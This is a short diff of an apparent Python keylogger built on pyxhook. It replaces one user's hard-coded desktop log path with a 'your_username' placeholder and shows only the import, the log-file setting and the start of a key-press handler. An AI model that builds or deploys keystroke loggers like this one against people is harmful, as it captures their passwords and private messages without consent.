@@ -1,8 +1,8 @@
 import pyxhook
 
 # This tells the keylogger where the log file will go (where characters are logged). Change it as is needed.
-# Redirects to what would be my desktop. This won't exist on yours, so you need to change it. :)
-log_file = '/home/Giacomo/Desktop/file.log'
+# Change `your_username` to your account name.
+log_file = '/home/your_username/Desktop/file.log'
 
 
 def OnKeyPress(event):
